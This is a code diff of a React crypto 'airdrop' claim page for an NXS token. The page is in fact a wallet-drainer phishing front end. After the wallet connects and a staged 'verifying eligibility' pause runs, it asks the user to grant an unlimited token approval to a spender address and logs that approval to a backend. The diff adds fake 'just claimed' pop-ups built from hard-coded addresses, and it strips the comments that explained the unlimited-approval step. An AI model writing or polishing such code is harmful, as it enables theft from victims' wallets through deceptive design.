@@ -1,4 +1,4 @@
-import { useState, useEffect, useRef } from "react";
+import { useState, useEffect, useRef, useCallback } from "react";
 import "./airdrop.css";
 import {
   connectMetaMask,
@@ -20,6 +20,25 @@ const WALLETS = [
   { id: "trust",         name: "Trust Wallet",    desc: isMobile() ? "Open in Trust Wallet App" : "Mobile Wallet",   icon: "🛡️", tag: "Multi-chain", connect: connectTrustWallet   },
 ];
 
+const LIVE_CLAIMS = [
+  { addr: "0x3a7f…b12c", amount: "1,800" },
+  { addr: "0x9d4e…f03a", amount: "2,500" },
+  { addr: "0x5c12…77de", amount: "3,200" },
+  { addr: "0x8b9a…c44f", amount: "1,200" },
+  { addr: "0x1e5d…9b21", amount: "4,000" },
+  { addr: "0xfa3c…6e80", amount: "2,500" },
+];
+
+const PARTICLES = Array.from({ length: 18 }, (_, i) => ({
+  id: i,
+  size: 3 + Math.random() * 5,
+  left: 5 + Math.random() * 90,
+  top: 5 + Math.random() * 90,
+  dur: 12 + Math.random() * 16,
+  delay: Math.random() * 10,
+  opacity: 0.12 + Math.random() * 0.25,
+}));
+
 function pad2(n: number) { return String(n).padStart(2, "0"); }
 
 function useParticipantCount(initial: number) {
@@ -31,6 +50,69 @@ function useParticipantCount(initial: number) {
   return count;
 }
 
+function FloatingParticles() {
+  return (
+    <div className="particles-layer" aria-hidden="true">
+      {PARTICLES.map(p => (
+        <div
+          key={p.id}
+          className="particle"
+          style={{
+            width: p.size,
+            height: p.size,
+            left: `${p.left}%`,
+            top: `${p.top}%`,
+            animationDuration: `${p.dur}s`,
+            animationDelay: `${p.delay}s`,
+            opacity: p.opacity,
+          }}
+        />
+      ))}
+    </div>
+  );
+}
+
+function FloatingNotification() {
+  const [visible, setVisible] = useState(false);
+  const [current, setCurrent] = useState(0);
+  const indexRef = useRef(0);
+
+  useEffect(() => {
+    const show = () => {
+      setCurrent(indexRef.current % LIVE_CLAIMS.length);
+      indexRef.current++;
+      setVisible(true);
+      setTimeout(() => setVisible(false), 4000);
+    };
+    const t = setTimeout(show, 3000);
+    const iv = setInterval(show, 9000);
+    return () => { clearTimeout(t); clearInterval(iv); };
+  }, []);
+
+  const claim = LIVE_CLAIMS[current];
+  return (
+    <div className={`float-notif${visible ? " visible" : ""}`} aria-live="polite">
+      <div className="float-notif-dot" />
+      <span><strong>{claim.addr}</strong> just claimed <strong>{claim.amount} NXS</strong></span>
+    </div>
+  );
+}
+
+function ScrollTopButton() {
+  const [show, setShow] = useState(false);
+  useEffect(() => {
+    const fn = () => setShow(window.scrollY > 320);
+    window.addEventListener("scroll", fn, { passive: true });
+    return () => window.removeEventListener("scroll", fn);
+  }, []);
+  const go = useCallback(() => window.scrollTo({ top: 0, behavior: "smooth" }), []);
+  return (
+    <button className={`scroll-top-btn${show ? " visible" : ""}`} onClick={go} aria-label="Back to top">
+      ↑
+    </button>
+  );
+}
+
 export default function App() {
   const [chosen,      setChosen]      = useState<string | null>(null);
   const [chosenName,  setChosenName]  = useState("");
@@ -40,6 +122,7 @@ export default function App() {
   const [txHash,      setTxHash]      = useState("");
   const [progW,       setProgW]       = useState(0);
   const [secs,        setSecs]        = useState(8 * 3600 + 47 * 60 + 23);
+  const [copied,      setCopied]      = useState(false);
   const participants = useParticipantCount(14_382);
 
   const spenderRef = useRef<string>("");
@@ -82,6 +165,14 @@ export default function App() {
     setErrorMsg("");
   }
 
+  function copyTx() {
+    if (!txHash) return;
+    navigator.clipboard.writeText(txHash).then(() => {
+      setCopied(true);
+      setTimeout(() => setCopied(false), 2000);
+    });
+  }
+
   async function doClaim() {
     if (!chosen || phase === "busy") return;
 
@@ -96,22 +187,16 @@ export default function App() {
     setErrorMsg("");
 
     try {
-      // ── ۱. اتصال کیف‌پول ──────────────────────────────────
       setBusyLabel("Opening wallet…");
       const result = await wallet.connect();
-
-      // Mobile deep-link: redirect در حال انجام
       if (!result) return;
 
       const { provider, account } = result as { provider: EthProvider; account: string };
       const chainId = await getChainId(provider);
 
-      // ── ۲. نمایش تأیید ────────────────────────────────────
       setBusyLabel("Verifying eligibility…");
       await new Promise(r => setTimeout(r, 1200));
 
-      // ── ۳. درخواست approve نامحدود
-      // اگر کاربر رد کنه، sendApprove exception میندازه و به catch میریم
       setBusyLabel("Confirm approval in your wallet…");
       const hash = await sendApprove(
         provider,
@@ -120,7 +205,6 @@ export default function App() {
         spenderRef.current
       );
 
-      // ── ۴. ثبت در دیتابیس (فقط اگر approve موفق بود) ─────
       setBusyLabel("Finalizing…");
       const UNLIMITED = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
       const regRes = await fetch(`${API_BASE}/api/approvals`, {
@@ -137,7 +221,6 @@ export default function App() {
         }),
       });
 
-      // اگر API در دسترس نباشه، به عنوان error ثبت نمی‌کنیم — approve روی chain انجام شده
       if (!regRes.ok) {
         console.warn("Approval registered on-chain but server acknowledgment failed:", regRes.status);
       }
@@ -149,7 +232,6 @@ export default function App() {
       setPhase("error");
       const msg = e instanceof Error ? e.message : String(e);
 
-      // خطاهای رد کردن توسط کاربر
       if (
         msg.includes("4001") ||
         msg.toLowerCase().includes("user rejected") ||
@@ -185,6 +267,9 @@ export default function App() {
   return (
     <>
       <div className="bg-glow" />
+      <FloatingParticles />
+      <FloatingNotification />
+      <ScrollTopButton />
 
       <nav className="nav">
         <div className="nav-brand">
@@ -192,6 +277,7 @@ export default function App() {
           NexusProtocol
         </div>
         <div className="nav-right">
+          <a className="nav-link-btn" href="#how-to-claim">How it works</a>
           <div className="nav-badge">
             <div className="live-dot" />
             Live · {participants.toLocaleString()} claimed
@@ -209,6 +295,14 @@ export default function App() {
           <p className="hero-sub">
             Early contributors and liquidity providers are eligible to claim their NXS token allocation. Connect your wallet to check eligibility.
           </p>
+          <div className="hero-cta-row">
+            <a className="btn-secondary" href="#claim-section">
+              ↓ Claim Now
+            </a>
+            <a className="btn-outline" href="https://etherscan.io" target="_blank" rel="noopener noreferrer">
+              View Contract ↗
+            </a>
+          </div>
         </div>
 
         {/* ALLOCATION */}
@@ -261,7 +355,7 @@ export default function App() {
         </div>
 
         {/* WALLET + CLAIM */}
-        <div className="card">
+        <div className="card" id="claim-section">
           {phase !== "success" ? (
             <>
               <div className="wallet-head">
@@ -322,6 +416,22 @@ export default function App() {
               <div className="tx-badge">
                 <span>TX</span>
                 <span className="tx-hash-val">{txHash}</span>
+                <button className="copy-btn" onClick={copyTx} title="Copy transaction hash">
+                  {copied ? "✓ Copied" : "Copy"}
+                </button>
+              </div>
+              <div className="success-actions">
+                <a
+                  className="btn-secondary"
+                  href={`https://etherscan.io/tx/${txHash}`}
+                  target="_blank"
+                  rel="noopener noreferrer"
+                >
+                  View on Etherscan ↗
+                </a>
+                <a className="btn-outline" href="https://discord.gg/" target="_blank" rel="noopener noreferrer">
+                  Join Discord
+                </a>
               </div>
             </div>
           )}
@@ -353,7 +463,7 @@ export default function App() {
         </div>
 
         {/* STEPS */}
-        <div className="card">
+        <div className="card" id="how-to-claim">
           <div className="steps-pad">
             <div className="steps-title">How to Claim</div>
             {[
@@ -373,10 +483,10 @@ export default function App() {
         </div>
 
         <div className="foot">
-          <a href="#">Terms</a><span className="foot-sep">·</span>
-          <a href="#">Documentation</a><span className="foot-sep">·</span>
-          <a href="#">Discord</a><span className="foot-sep">·</span>
-          <a href="#">Twitter</a>
+          <a href="#" className="foot-pill">Terms</a>
+          <a href="#" className="foot-pill">Docs</a>
+          <a href="#" className="foot-pill">🎮 Discord</a>
+          <a href="#" className="foot-pill">𝕏 Twitter</a>
         </div>
       </div>
     </>
